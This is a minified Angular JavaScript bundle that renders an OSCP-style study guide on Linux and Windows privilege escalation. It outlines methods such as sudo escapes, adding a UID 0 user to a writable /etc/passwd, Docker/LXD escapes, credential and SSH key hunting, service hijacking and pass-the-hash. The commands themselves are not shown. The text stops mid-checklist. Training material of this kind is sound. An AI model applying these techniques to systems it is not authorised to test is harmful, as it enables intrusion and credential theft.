import{a as f,b,c as k,d as P,e as C,f as A,g as T,h as O}from"./chunk-SFRSLJCO.js";import"./chunk-GFLLK36M.js";import{$ as u,$a as w,Ea as t,F as x,U as a,Va as g,Wa as y,Za as v,da as S,ka as r,la as n,ma as e,na as l,ra as d,sa as c,ua as E,va as h,y as p}from"./chunk-FQT5HG3D.js";function L(o,s){if(o&1&&(d(0),n(1,"div",9)(2,"h2"),t(3,"Linux Privilege Escalation"),e(),n(4,"p",10),t(5," Systematic enumeration and identification of common Linux privilege escalation vectors. "),e(),n(6,"mat-accordion",11)(7,"mat-expansion-panel")(8,"mat-expansion-panel-header")(9,"mat-panel-title"),t(10,"1. Initial Enumeration"),e()(),n(11,"mat-accordion",11)(12,"mat-expansion-panel")(13,"mat-expansion-panel-header")(14,"mat-panel-title"),t(15,"Basic Enumeration"),e()(),n(16,"p")(17,"strong"),t(18,"Objective:"),e(),t(19," Understand the current user, groups, operating system and environment. "),e(),l(20,"app-terminal",12),n(21,"h3"),t(22,"What to look for"),e(),n(23,"ul")(24,"li"),t(25,"Interesting groups such as sudo, docker, lxd or adm."),e(),n(26,"li"),t(27,"Potentially vulnerable kernel versions."),e(),n(28,"li"),t(29,"Processes running as root."),e(),n(30,"li"),t(31,"Sensitive environment variables."),e()()(),n(32,"mat-expansion-panel")(33,"mat-expansion-panel-header")(34,"mat-panel-title"),t(35,"Process Enumeration"),e()(),n(36,"p"),t(37," Running processes can expose credentials, custom scripts and root-owned services. "),e(),l(38,"app-terminal",12),n(39,"h3"),t(40,"Useful Filters"),e(),l(41,"app-terminal",12),n(42,"h3"),t(43,"Example Red Flags"),e(),l(44,"app-terminal",12),n(45,"ul")(46,"li"),t(47,"Credentials exposed in command-line arguments."),e(),n(48,"li"),t(49,"Root executing scripts from writable directories."),e(),n(50,"li"),t(51,"Unknown or custom binaries running as root."),e(),n(52,"li"),t(53,"Services listening only on localhost."),e()()(),n(54,"mat-expansion-panel")(55,"mat-expansion-panel-header")(56,"mat-panel-title"),t(57,"Bash History"),e()(),n(58,"p"),t(59," Bash history may contain passwords, SSH commands, API keys and reused credentials. "),e(),n(60,"h3"),t(61,"Common History Files"),e(),l(62,"app-terminal",12),n(63,"h3"),t(64,"Search for Sensitive Information"),e(),l(65,"app-terminal",12),n(66,"h3"),t(67,"System-Wide Search"),e(),l(68,"app-terminal",12),e()()(),n(69,"mat-expansion-panel")(70,"mat-expansion-panel-header")(71,"mat-panel-title"),t(72,"2. Sudo Misconfigurations"),e()(),n(73,"mat-accordion",11)(74,"mat-expansion-panel")(75,"mat-expansion-panel-header")(76,"mat-panel-title"),t(77,"Initial Check"),e()(),n(78,"p")(79,"strong"),t(80,"Always run this early."),e(),t(81," Check which commands the current user can execute with sudo. "),e(),l(82,"app-terminal",12),n(83,"h3"),t(84,"Look for"),e(),n(85,"ul")(86,"li"),t(87,"NOPASSWD entries."),e(),n(88,"li"),t(89,"Wildcard permissions."),e(),n(90,"li"),t(91,"SETENV permissions."),e(),n(92,"li"),t(93,"Unsafe binaries executed as root."),e()()(),n(94,"mat-expansion-panel")(95,"mat-expansion-panel-header")(96,"mat-panel-title"),t(97,"High-Risk Binaries"),e()(),n(98,"p"),t(99," If one of these binaries is available through sudo, check GTFOBins immediately. "),e(),l(100,"app-terminal",12),e(),n(101,"mat-expansion-panel")(102,"mat-expansion-panel-header")(103,"mat-panel-title"),t(104,"Common Sudo Escapes"),e()(),n(105,"mat-accordion",11)(106,"mat-expansion-panel")(107,"mat-expansion-panel-header")(108,"mat-panel-title"),t(109,"Vim / Vi"),e()(),l(110,"app-terminal",12),e(),n(111,"mat-expansion-panel")(112,"mat-expansion-panel-header")(113,"mat-panel-title"),t(114,"Less / More"),e()(),l(115,"app-terminal",12),e(),n(116,"mat-expansion-panel")(117,"mat-expansion-panel-header")(118,"mat-panel-title"),t(119,"Find"),e()(),l(120,"app-terminal",12),e(),n(121,"mat-expansion-panel")(122,"mat-expansion-panel-header")(123,"mat-panel-title"),t(124,"Awk"),e()(),l(125,"app-terminal",12),e(),n(126,"mat-expansion-panel")(127,"mat-expansion-panel-header")(128,"mat-panel-title"),t(129,"Python"),e()(),l(130,"app-terminal",12),e(),n(131,"mat-expansion-panel")(132,"mat-expansion-panel-header")(133,"mat-panel-title"),t(134,"Perl"),e()(),l(135,"app-terminal",12),e()()()()(),n(136,"mat-expansion-panel")(137,"mat-expansion-panel-header")(138,"mat-panel-title"),t(139,"Sudo Escalation Decision Checklist"),e()(),n(140,"p"),t(141,"Prioritize NOPASSWD entries, wildcard arguments and preserved environment variables. Check the exact binary and its sudo-specific GTFOBins behavior before selecting an approach."),e(),l(142,"app-terminal",12),e(),n(143,"mat-expansion-panel")(144,"mat-expansion-panel-header")(145,"mat-panel-title"),t(146,"3. SUID Binaries"),e()(),n(147,"p"),t(148," SUID binaries execute with the privileges of their owner. Root-owned SUID binaries can potentially lead to privilege escalation. "),e(),l(149,"app-terminal",12),n(150,"h3"),t(151,"Example"),e(),l(152,"app-terminal",12),n(153,"p"),t(154," After identifying interesting binaries, check whether they can be abused using GTFOBins. "),e()(),n(155,"mat-expansion-panel")(156,"mat-expansion-panel-header")(157,"mat-panel-title"),t(158,"4. Linux Capabilities"),e()(),n(159,"p"),t(160," Linux capabilities can grant privileged functionality to binaries without requiring full root privileges. "),e(),n(161,"h3"),t(162,"Enumeration"),e(),l(163,"app-terminal",12),n(164,"h3"),t(165,"Dangerous Example"),e(),l(166,"app-terminal",12),n(167,"h3"),t(168,"Possible Abuse"),e(),l(169,"app-terminal",12),e(),n(170,"mat-expansion-panel")(171,"mat-expansion-panel-header")(172,"mat-panel-title"),t(173,"5. Cron Jobs"),e()(),n(174,"p"),t(175," Scheduled tasks are especially interesting when root executes scripts that can be modified by a lower-privileged user. "),e(),l(176,"app-terminal",12),n(177,"h3"),t(178,"Observe Processes with pspy"),e(),n(179,"p"),t(180," pspy can reveal scheduled jobs and short-lived processes that are not obvious from static cron files. Verify the binary source and inspect permissions before treating an observed task as a privilege-escalation path. "),e(),l(181,"app-terminal",12),n(182,"h3"),t(183,"Look for"),e(),n(184,"ul")(185,"li"),t(186,"Root-owned cron jobs."),e(),n(187,"li"),t(188,"Writable scripts executed by root."),e(),n(189,"li"),t(190,"Relative paths."),e(),n(191,"li"),t(192,"PATH hijacking opportunities."),e()()(),n(193,"mat-expansion-panel")(194,"mat-expansion-panel-header")(195,"mat-panel-title"),t(196,"6. Writable Files & Permissions"),e()(),n(197,"p"),t(198," Not every writable file is useful. Prioritize files that influence authentication, execution or privileged services. "),e(),l(199,"app-terminal",12),n(200,"h3"),t(201,"High-Value Targets"),e(),n(202,"ol")(203,"li"),t(204,"/etc/sudoers"),e(),n(205,"li"),t(206,"/etc/passwd"),e(),n(207,"li"),t(208,"/etc/shadow"),e(),n(209,"li"),t(210,"/etc/crontab"),e(),n(211,"li"),t(212,"/etc/cron.*"),e(),n(213,"li"),t(214,"Systemd service files."),e(),n(215,"li"),t(216,"Application configuration files."),e()()(),n(217,"mat-expansion-panel")(218,"mat-expansion-panel-header")(219,"mat-panel-title"),t(220,"Writable File Escalation Priority"),e()(),n(221,"p"),t(222,"Prioritize writable files that influence authentication, scheduled execution or privileged services. A writable file is only useful when it is trusted or executed by a more privileged context."),e(),l(223,"app-terminal",12),e(),n(224,"mat-expansion-panel")(225,"mat-expansion-panel-header")(226,"mat-panel-title"),t(227,"7. Writable /etc/passwd"),e()(),n(228,"mat-accordion",11)(229,"mat-expansion-panel")(230,"mat-expansion-panel-header")(231,"mat-panel-title"),t(232,"Check Permissions"),e()(),l(233,"app-terminal",12),n(234,"p"),t(235," A writable "),n(236,"code"),t(237,"/etc/passwd"),e(),t(238," can potentially allow the creation of a privileged account. "),e()(),n(239,"mat-expansion-panel")(240,"mat-expansion-panel-header")(241,"mat-panel-title"),t(242,"Generate Password Hash"),e()(),l(243,"app-terminal",12),e(),n(244,"mat-expansion-panel")(245,"mat-expansion-panel-header")(246,"mat-panel-title"),t(247,"Create UID 0 User"),e()(),n(248,"p"),t(249," Replace "),n(250,"code"),t(251,"HASH"),e(),t(252," with the generated password hash. "),e(),l(253,"app-terminal",12),e(),n(254,"mat-expansion-panel")(255,"mat-expansion-panel-header")(256,"mat-panel-title"),t(257,"Switch User"),e()(),l(258,"app-terminal",12),e()()(),n(259,"mat-expansion-panel")(260,"mat-expansion-panel-header")(261,"mat-panel-title"),t(262,"8. Docker / LXD Groups"),e()(),n(263,"mat-accordion",11)(264,"mat-expansion-panel")(265,"mat-expansion-panel-header")(266,"mat-panel-title"),t(267,"Check Groups"),e()(),l(268,"app-terminal",12),n(269,"p"),t(270," Pay special attention to groups such as "),n(271,"code"),t(272,"docker"),e(),t(273,", "),n(274,"code"),t(275,"lxd"),e(),t(276," and other privileged groups. "),e()(),n(277,"mat-expansion-panel")(278,"mat-expansion-panel-header")(279,"mat-panel-title"),t(280,"Docker"),e()(),l(281,"app-terminal",12),e(),n(282,"mat-expansion-panel")(283,"mat-expansion-panel-header")(284,"mat-panel-title"),t(285,"LXD"),e()(),l(286,"app-terminal",12),e()()(),n(287,"mat-expansion-panel")(288,"mat-expansion-panel-header")(289,"mat-panel-title"),t(290,"9. PATH Hijacking"),e()(),n(291,"mat-accordion",11)(292,"mat-expansion-panel")(293,"mat-expansion-panel-header")(294,"mat-panel-title"),t(295,"PATH Reconnaissance"),e()(),l(296,"app-terminal",12),e(),n(297,"mat-expansion-panel")(298,"mat-expansion-panel-header")(299,"mat-panel-title"),t(300,"Writable PATH Directories"),e()(),l(301,"app-terminal",12),e(),n(302,"mat-expansion-panel")(303,"mat-expansion-panel-header")(304,"mat-panel-title"),t(305,"Create Hijack Binary"),e()(),l(306,"app-terminal",12),n(307,"p"),t(308," This becomes interesting when a privileged script executes commands without using absolute paths. "),e()()()(),n(309,"mat-expansion-panel")(310,"mat-expansion-panel-header")(311,"mat-panel-title"),t(312,"PATH Hijacking Validation"),e()(),n(313,"p"),t(314,"Confirm that a privileged script invokes a command without an absolute path, the controlled directory is first in resolution order, and the privileged process inherits that PATH. Absolute paths and sudo environment sanitization invalidate the candidate."),e(),l(315,"app-terminal",12),e(),n(316,"mat-expansion-panel")(317,"mat-expansion-panel-header")(318,"mat-panel-title"),t(319,"10. Wildcard Injection"),e()(),n(320,"p"),t(321," Wildcards can be dangerous when attacker-controlled filenames are expanded into arguments for privileged commands. "),e(),n(322,"h3"),t(323,"Common Risk Patterns"),e(),l(324,"app-terminal",12),n(325,"h3"),t(326,"Tar Example"),e(),l(327,"app-terminal",12),n(328,"p"),t(329," Always inspect the available options of the binary rather than guessing possible arguments. "),e()(),n(330,"mat-expansion-panel")(331,"mat-expansion-panel-header")(332,"mat-panel-title"),t(333,"Wildcard Injection Analysis"),e()(),n(334,"p"),t(335,"Inspect the command's supported options and derive candidate filenames from flags that accept external files or trigger execution. Only test this when the working directory and privileged command are authorized."),e(),l(336,"app-terminal",12),e(),n(337,"mat-expansion-panel")(338,"mat-expansion-panel-header")(339,"mat-panel-title"),t(340,"11. Password & Credential Hunting"),e()(),n(341,"mat-accordion",11)(342,"mat-expansion-panel")(343,"mat-expansion-panel-header")(344,"mat-panel-title"),t(345,"Password Hunting"),e()(),l(346,"app-terminal",12),e(),n(347,"mat-expansion-panel")(348,"mat-expansion-panel-header")(349,"mat-panel-title"),t(350,"SSH Private Keys"),e()(),n(351,"h3"),t(352,"Find Keys"),e(),l(353,"app-terminal",12),n(354,"h3"),t(355,"Fix Permissions"),e(),l(356,"app-terminal",12),n(357,"h3"),t(358,"Login Using the Key"),e(),l(359,"app-terminal",12),n(360,"h3"),t(361,"Crack Protected Keys"),e(),l(362,"app-terminal",12),e()()(),n(363,"mat-expansion-panel")(364,"mat-expansion-panel-header")(365,"mat-panel-title"),t(366,"SSH Key Follow-up"),e()(),n(367,"p"),t(368,"After locating a key, review authorized keys and validate reuse only for accounts and hosts in scope."),e(),l(369,"app-terminal",12),e(),n(370,"mat-expansion-panel")(371,"mat-expansion-panel-header")(372,"mat-panel-title"),t(373,"12. LD_PRELOAD"),e()(),n(374,"mat-accordion",11)(375,"mat-expansion-panel")(376,"mat-expansion-panel-header")(377,"mat-panel-title"),t(378,"Check Sudo Configuration"),e()(),l(379,"app-terminal",12),n(380,"p"),t(381,"Look for permissions related to environment preservation or SETENV."),e()(),n(382,"mat-expansion-panel")(383,"mat-expansion-panel-header")(384,"mat-panel-title"),t(385,"Compile Shared Library"),e()(),l(386,"app-terminal",12),e(),n(387,"mat-expansion-panel")(388,"mat-expansion-panel-header")(389,"mat-panel-title"),t(390,"Library Source and Preconditions"),e()(),n(391,"p"),t(392,"LD_PRELOAD abuse requires sudo to preserve the variable (for example through SETENV or env_keep) and a dynamically linked permitted binary. It will not work when the environment is sanitized or the target is static."),e(),l(393,"app-terminal",12),e(),n(394,"mat-expansion-panel")(395,"mat-expansion-panel-header")(396,"mat-panel-title"),t(397,"Execute with LD_PRELOAD"),e()(),l(398,"app-terminal",12),e()()(),n(399,"mat-expansion-panel")(400,"mat-expansion-panel-header")(401,"mat-panel-title"),t(402,"13. Kernel Exploits"),e()(),n(403,"p"),t(404," Kernel exploitation should generally be considered after checking simpler and more reliable privilege escalation vectors. "),e(),l(405,"app-terminal",12),n(406,"p"),t(407," Always verify the exact kernel version and exploit requirements before attempting exploitation. "),e()(),n(408,"mat-expansion-panel")(409,"mat-expansion-panel-header")(410,"mat-panel-title"),t(411,"Kernel Exploit Transfer and Validation"),e()(),n(412,"p"),t(413,"Use kernel exploits only after checking simpler vectors. Verify the exact kernel, architecture and exploit prerequisites before compiling or running a candidate."),e(),l(414,"app-terminal",12),e(),n(415,"mat-expansion-panel")(416,"mat-expansion-panel-header")(417,"mat-panel-title"),t(418,"14. Automated Enumeration"),e()(),n(419,"p"),t(420," Automated tools such as "),n(421,"strong"),t(422,"LinPEAS"),e(),t(423," are useful for finding potential misconfigurations quickly, but every finding should still be manually verified. "),e(),l(424,"app-terminal",12),n(425,"p")(426,"strong"),t(427,"Always verify manually:"),e()(),l(428,"app-terminal",12),e(),n(429,"mat-expansion-panel")(430,"mat-expansion-panel-header")(431,"mat-panel-title"),t(432,"15. OSCP Mental Flow"),e()(),n(433,"p"),t(434," A simple workflow to avoid missing the most common Linux privilege escalation vectors. "),e(),l(435,"app-terminal",12),n(436,"h3"),t(437,"Quick Priority"),e(),n(438,"ol")(439,"li"),t(440,"Understand your current user and groups."),e(),n(441,"li"),t(442,"Run "),n(443,"code"),t(444,"sudo -l"),e(),t(445,"."),e(),n(446,"li"),t(447,"Enumerate SUID binaries."),e(),n(448,"li"),t(449,"Check capabilities."),e(),n(450,"li"),t(451,"Inspect cron jobs and scheduled tasks."),e(),n(452,"li"),t(453,"Look for writable files and scripts."),e(),n(454,"li"),t(455,"Check Docker and LXD group membership."),e(),n(456,"li"),t(457,"Search for credentials."),e(),n(458,"li"),t(459,"Consider kernel exploits as a later option."),e()()()()(),c()),o&2){let i=h();a(20),r("command",i.basicEnumeration),a(18),r("command",i.processEnumeration),a(3),r("command",i.processFilters),a(3),r("command",i.processRedFlags),a(18),r("command",i.bashHistory),a(3),r("command",i.bashHistorySearch),a(3),r("command",i.bashHistorySystem),a(14),r("command",i.sudoCheck),a(18),r("command",i.sudoHighRisk),a(10),r("command",i.sudoVim),a(5),r("command",i.sudoLess),a(5),r("command",i.sudoFind),a(5),r("command",i.sudoAwk),a(5),r("command",i.sudoPython),a(5),r("command",i.sudoPerl),a(7),r("command",i.sudoStrategy),a(7),r("command",i.suidEnumeration),a(3),r("command",i.suidExample),a(11),r("command",i.capabilities),a(3),r("command",i.capabilitiesExample),a(3),r("command",i.capabilitiesExploit),a(7),r("command",i.cronEnumeration),a(5),r("command",i.pspyMonitoring),a(18),r("command",i.writableFiles),a(24),r("command",i.writablePriority),a(10),r("command",i.passwdPermissions),a(10),r("command",i.passwdHash),a(10),r("command",i.passwdInject),a(5),r("command",i.passwdSwitch),a(10),r("command",i.dockerGroups),a(13),r("command",i.dockerEscape),a(5),r("command",i.lxdEscape),a(10),r("command",i.pathRecon),a(5),r("command",i.pathWritable),a(5),r("command",i.pathHijack),a(9),r("command",i.pathHijackValidation),a(9),r("command",i.wildcardExamples),a(3),r("command",i.wildcardTar),a(9),r("command",i.wildcardAnalysis),a(10),r("command",i.passwordHunting),a(7),r("command",i.sshKeys),a(3),r("command",i.sshKeyPermissions),a(3),r("command",i.sshLogin),a(3),r("command",i.sshKeyCrack),a(7),r("command",i.sshKeyFollowUp),a(10),r("command",i.ldPreloadCheck),a(7),r("command",i.ldPreloadCompile),a(7),r("command",i.ldPreloadSource),a(5),r("command",i.ldPreloadExploit),a(7),r("command",i.kernelEnumeration),a(9),r("command",i.kernelExploitTransfer),a(10),r("command",i.linuxAutomatedEnum),a(4),r("command",i.linuxManualVerify),a(7),r("command",i.oscpMentalFlow)}}function M(o,s){if(o&1&&(d(0),n(1,"div",9)(2,"h2"),t(3,"Windows Privilege Escalation"),e(),n(4,"p",10),t(5," Windows privilege escalation enumeration, exploitation and OSCP methodology. "),e(),n(6,"mat-accordion",11)(7,"mat-expansion-panel")(8,"mat-expansion-panel-header")(9,"mat-panel-title"),t(10,"1. Identity & Token Enumeration"),e()(),n(11,"p"),t(12," Always start by identifying the current user, groups, privileges and integrity level. "),e(),l(13,"app-terminal",12),n(14,"p")(15,"strong"),t(16,"Important privileges:"),e()(),n(17,"ul")(18,"li")(19,"strong"),t(20,"SeBackupPrivilege"),e(),t(21," \u2192 Dump SAM / SYSTEM."),e(),n(22,"li")(23,"strong"),t(24,"SeRestorePrivilege"),e(),t(25," \u2192 Overwrite protected files."),e(),n(26,"li")(27,"strong"),t(28,"SeImpersonatePrivilege"),e(),t(29," \u2192 Token impersonation."),e(),n(30,"li")(31,"strong"),t(32,"High Integrity"),e(),t(33," \u2192 Elevated token."),e()()(),n(34,"mat-expansion-panel")(35,"mat-expansion-panel-header")(36,"mat-panel-title"),t(37,"2. Users & Groups"),e()(),n(38,"p"),t(39,"Enumerate local and domain users and identify privileged group membership."),e(),l(40,"app-terminal",12),e(),n(41,"mat-expansion-panel")(42,"mat-expansion-panel-header")(43,"mat-panel-title"),t(44,"3. System Enumeration"),e()(),l(45,"app-terminal",12),n(46,"p")(47,"strong"),t(48,"Drivers:"),e()(),l(49,"app-terminal",12),e(),n(50,"mat-expansion-panel")(51,"mat-expansion-panel-header")(52,"mat-panel-title"),t(53,"Registry and UAC Checks"),e()(),n(54,"p"),t(55,"Review UAC-related policy values and system context as indicators; do not treat a registry value by itself as proof of an exploitable path."),e(),l(56,"app-terminal",12),e(),n(57,"mat-expansion-panel")(58,"mat-expansion-panel-header")(59,"mat-panel-title"),t(60,"Event Log Review"),e()(),n(61,"p"),t(62,"Security event availability depends on audit policy and access rights. Process-creation events can help reconstruct privileged execution and identify useful context."),e(),l(63,"app-terminal",12),e(),n(64,"mat-expansion-panel")(65,"mat-expansion-panel-header")(66,"mat-panel-title"),t(67,"Startup and Process Enumeration"),e()(),n(68,"p"),t(69,"Inspect startup entries and relevant services or processes for unusual paths, accounts and writable locations."),e(),l(70,"app-terminal",12),e(),n(71,"mat-expansion-panel")(72,"mat-expansion-panel-header")(73,"mat-panel-title"),t(74,"4. Network Enumeration"),e()(),l(75,"app-terminal",12),e(),n(76,"mat-expansion-panel")(77,"mat-expansion-panel-header")(78,"mat-panel-title"),t(79,"5. Credential Hunting"),e()(),n(80,"mat-accordion",11)(81,"mat-expansion-panel")(82,"mat-expansion-panel-header")(83,"mat-panel-title"),t(84,"File Searching"),e()(),l(85,"app-terminal",12),e(),n(86,"mat-expansion-panel")(87,"mat-expansion-panel-header")(88,"mat-panel-title"),t(89,"Registry Credentials"),e()(),l(90,"app-terminal",12),e(),n(91,"mat-expansion-panel")(92,"mat-expansion-panel-header")(93,"mat-panel-title"),t(94,"Saved Credentials"),e()(),l(95,"app-terminal",12),e(),n(96,"mat-expansion-panel")(97,"mat-expansion-panel-header")(98,"mat-panel-title"),t(99,"PowerShell History"),e()(),l(100,"app-terminal",12),e()()(),n(101,"mat-expansion-panel")(102,"mat-expansion-panel-header")(103,"mat-panel-title"),t(104,"Credential Reuse Validation"),e()(),n(105,"p"),t(106,"When authorized credentials are discovered, verify account scope and effective privileges before attempting any alternate-account access. Do not create or trigger tasks or remote sessions without explicit authorization."),e()(),n(107,"mat-expansion-panel")(108,"mat-expansion-panel-header")(109,"mat-panel-title"),t(110,"Additional Credential Artifacts"),e()(),n(111,"p"),t(112,"Check the native PowerShell history path and other authorized credential artifacts. Treat output as sensitive and avoid exposing secrets in logs."),e(),l(113,"app-terminal",12),e(),n(114,"mat-expansion-panel")(115,"mat-expansion-panel-header")(116,"mat-panel-title"),t(117,"6. Interesting Files Enumeration"),e()(),n(118,"p"),t(119," Search for configuration files, scripts, backups and documents that may contain credentials, connection strings, tokens or other useful information. "),e(),l(120,"app-terminal",12),e(),n(121,"mat-expansion-panel")(122,"mat-expansion-panel-header")(123,"mat-panel-title"),t(124,"File and Directory ACL Review"),e()(),n(125,"p"),t(126,"Check ownership and ACLs on files referenced by privileged services or tasks. A weak ACL is actionable only when it grants the current account the required write access and a privileged execution trigger exists."),e(),l(127,"app-terminal",12),e(),n(128,"mat-expansion-panel")(129,"mat-expansion-panel-header")(130,"mat-panel-title"),t(131,"7. Services Enumeration"),e()(),l(132,"app-terminal",12),n(133,"p")(134,"strong"),t(135,"Look for:"),e()(),n(136,"ul")(137,"li"),t(138,"Unquoted service paths."),e(),n(139,"li"),t(140,"Writable service binaries."),e(),n(141,"li"),t(142,"Weak service configuration permissions."),e(),n(143,"li"),t(144,"Services running as SYSTEM."),e()(),n(145,"h3"),t(146,"Service Permissions"),e(),n(147,"p"),t(148,"Inspect the service descriptor and file ACLs; verify all escalation conditions."),e(),l(149,"app-terminal",12),e(),n(150,"mat-expansion-panel")(151,"mat-expansion-panel-header")(152,"mat-panel-title"),t(153,"8. Unquoted Service Paths"),e()(),n(154,"p"),t(155," An unquoted service path containing spaces may allow Windows to execute an unexpected binary if an intermediate directory is writable. "),e(),l(156,"app-terminal",12),n(157,"p")(158,"strong"),t(159,"All conditions must be true:"),e()(),n(160,"ul")(161,"li"),t(162,"The path contains spaces."),e(),n(163,"li"),t(164,"The executable path is not quoted."),e(),n(165,"li"),t(166,"An intermediate directory is writable."),e(),n(167,"li"),t(168,"The service can be triggered."),e()(),n(169,"p")(170,"strong"),t(171,"Important:"),e(),t(172," An unquoted path alone does not make a service exploitable. "),e()(),n(173,"mat-expansion-panel")(174,"mat-expansion-panel-header")(175,"mat-panel-title"),t(176,"9. Service Binary Hijacking"),e()(),n(177,"p"),t(178," If a service runs as SYSTEM and its executable is writable, replacing the binary can result in SYSTEM code execution. "),e(),l(179,"app-terminal",12),n(180,"p")(181,"strong"),t(182,"Exploitation conditions:"),e()(),n(183,"ul")(184,"li"),t(185,"Service runs as LocalSystem."),e(),n(186,"li"),t(187,"Binary is writable."),e(),n(188,"li"),t(189,"The service can be restarted or triggered."),e()(),n(190,"p")(191,"strong"),t(192,"OSCP rule:"),e()(),l(193,"app-terminal",12),e(),n(194,"mat-expansion-panel")(195,"mat-expansion-panel-header")(196,"mat-panel-title"),t(197,"10. DLL Hijacking"),e()(),n(198,"p"),t(199," Look for applications or services loading DLLs from writable directories. "),e(),l(200,"app-terminal",12),e(),n(201,"mat-expansion-panel")(202,"mat-expansion-panel-header")(203,"mat-panel-title"),t(204,"11. Scheduled Tasks"),e()(),n(205,"mat-accordion",11)(206,"mat-expansion-panel")(207,"mat-expansion-panel-header")(208,"mat-panel-title"),t(209,"Enumeration"),e()(),l(210,"app-terminal",12),e(),n(211,"mat-expansion-panel")(212,"mat-expansion-panel-header")(213,"mat-panel-title"),t(214,"Task Filtering"),e()(),l(215,"app-terminal",12),e(),n(216,"mat-expansion-panel")(217,"mat-expansion-panel-header")(218,"mat-panel-title"),t(219,"Inspect Task"),e()(),l(220,"app-terminal",12),e(),n(221,"mat-expansion-panel")(222,"mat-expansion-panel-header")(223,"mat-panel-title"),t(224,"Referenced Files"),e()(),l(225,"app-terminal",12),e(),n(226,"mat-expansion-panel")(227,"mat-expansion-panel-header")(228,"mat-panel-title"),t(229,"Permissions"),e()(),l(230,"app-terminal",12),e()()(),n(231,"mat-expansion-panel")(232,"mat-expansion-panel-header")(233,"mat-panel-title"),t(234,"Scheduled Task Context Review"),e()(),n(235,"p"),t(236,"For custom tasks, review the author, principal, triggers, action arguments and referenced working directory. Pay particular attention to scripts or binaries in writable locations."),e(),l(237,"app-terminal",12),e(),n(238,"mat-expansion-panel")(239,"mat-expansion-panel-header")(240,"mat-panel-title"),t(241,"12. AlwaysInstallElevated"),e()(),n(242,"p"),t(243," This is only misconfigured when both the current-user and machine policy values are enabled. Treat MSI installation as a system-level change; use only the designated lab package. "),e(),l(244,"app-terminal",12),e(),n(245,"mat-expansion-panel")(246,"mat-expansion-panel-header")(247,"mat-panel-title"),t(248,"13. SeImpersonatePrivilege Abuse"),e()(),n(249,"p"),t(250," Check whether the current account possesses SeImpersonatePrivilege. "),e(),l(251,"app-terminal",12),n(252,"p"),t(253," If the privilege is enabled, token impersonation techniques may allow escalation to SYSTEM depending on the Windows version and execution context. "),e(),l(254,"app-terminal",12),e(),n(255,"mat-expansion-panel")(256,"mat-expansion-panel-header")(257,"mat-panel-title"),t(258,"14. Backup Operators Abuse"),e()(),n(259,"p"),t(260," Backup-related privileges may allow access to protected registry hives and other sensitive files. "),e(),l(261,"app-terminal",12),n(262,"p")(263,"strong"),t(264,"Offline hash extraction:"),e()(),l(265,"app-terminal",12),n(266,"p")(267,"strong"),t(268,"Pass-the-Hash:"),e()(),l(269,"app-terminal",12),e(),n(270,"mat-expansion-panel")(271,"mat-expansion-panel-header")(272,"mat-panel-title"),t(273,"Offline NTDS Credential Analysis"),e()(),n(274,"p"),t(275,"Only perform offline extraction on an authorized domain-controller image or lab. Protect copied hive data and extracted hashes as credentials."),e(),l(276,"app-terminal",12),e(),n(277,"mat-expansion-panel")(278,"mat-expansion-panel-header")(279,"mat-panel-title"),t(280,"15. Kernel Exploits"),e()(),n(281,"p"),t(282," Consider kernel exploitation only after normal privilege escalation enumeration has been exhausted. "),e(),l(283,"app-terminal",12),e(),n(284,"mat-expansion-panel")(285,"mat-expansion-panel-header")(286,"mat-panel-title"),t(287,"Windows Exploit Suggester"),e()(),n(288,"p"),t(289,"Use an exploit suggester as a shortlist only; verify the OS build, installed patches, architecture and exploit prerequisites manually."),e(),l(290,"app-terminal",12),e(),n(291,"mat-expansion-panel")(292,"mat-expansion-panel-header")(293,"mat-panel-title"),t(294,"16. Automated Enumeration"),e()(),n(295,"p"),t(296," Automated tools are useful for finding potential misconfigurations, but every finding should be manually verified. "),e(),l(297,"app-terminal",12),n(298,"p")(299,"strong"),t(300,"Always verify manually:"),e()(),l(301,"app-terminal",12),e(),n(302,"mat-expansion-panel")(303,"mat-expansion-panel-header")(304,"mat-panel-title"),t(305,"17. OSCP Mental Checklist"),e()(),n(306,"ol")(307,"li"),t(308,"Who am I?"),e(),n(309,"li"),t(310,"What privileges do I have?"),e(),n(311,"li"),t(312,"What groups am I a member of?"),e(),n(313,"li"),t(314,"Any interesting credentials?"),e(),n(315,"li"),t(316,"Any writable services?"),e(),n(317,"li"),t(318,"Can this user change a service configuration?"),e(),n(319,"li"),t(320,"Any unquoted service paths?"),e(),n(321,"li"),t(322,"Any scheduled tasks?"),e(),n(323,"li"),t(324,"Are both AlwaysInstallElevated policies enabled?"),e(),n(325,"li"),t(326,"Do I have SeImpersonatePrivilege?"),e(),n(327,"li"),t(328,"Am I a member of Backup Operators?"),e(),n(329,"li"),t(330,"Any writable files or directories?"),e(),n(331,"li"),t(332,"Any interesting scripts or configuration files?"),e(),n(333,"li"),t(334,"Any kernel-level vulnerability?"),e()()(),n(335,"mat-expansion-panel")(336,"mat-expansion-panel-header")(337,"mat-panel-title"),t(338,"18. Windows PrivEsc Practical Checklist"),e()(),n(339,"mat-accordion",11)(340,"mat-expansion-panel")(341,"mat-expansion-panel-header")(342,"mat-panel-title"),t(343,"Initial Enumeration"),e()(),n(344,"ul")(345,"li"),t(346,"Ran whoami /all."),e(),n(347,"li"),t(348,"Checked privileges."),e(),n(349,"li"),t(350,"Checked groups."),e(),n(351,"li"),t(352,"Identified Integrity Level."),e()()(),n(353,"mat-expansion-panel")(354,"mat-expansion-panel-header")(355,"mat-panel-title"),t(356,"System & Patch Level"),e()(),n(357,"ul")(358,"li"),t(359,"Ran systeminfo."),e(),n(360,"li"),t(361,"Checked installed hotfixes."),e(),n(362,"li"),t(363,"Identified OS architecture."),e()()(),n(364,"mat-expansion-panel")(365,"mat-expansion-panel-header")(366,"mat-panel-title"),t(367,"Credential Hunting"),e()(),n(368,"ul")(369,"li"),t(370,"Searched for password files."),e(),n(371,"li"),t(372,"Checked registry credentials."),e(),n(373,"li"),t(374,"Checked cmdkey."),e(),n(375,"li"),t(376,"Checked PowerShell history."),e()()(),n(377,"mat-expansion-panel")(378,"mat-expansion-panel-header")(379,"mat-panel-title"),t(380,"Services & Tasks"),e()(),n(381,"ul")(382,"li"),t(383,"Enumerated services."),e(),n(384,"li"),t(385,"Checked service configuration permissions."),e(),n(386,"li"),t(387,"Checked unquoted service paths."),e(),n(388,"li"),t(389,"Checked service binary permissions."),e(),n(390,"li"),t(391,"Enumerated scheduled tasks."),e(),n(392,"li"),t(393,"Checked task binary/script permissions."),e(),n(394,"li"),t(395,"Checked AlwaysInstallElevated in both policy hives."),e()()(),n(396,"mat-expansion-panel")(397,"mat-expansion-panel-header")(398,"mat-panel-title"),t(399,"Privilege Abuse"),e()(),n(400,"ul")(401,"li"),t(402,"Checked 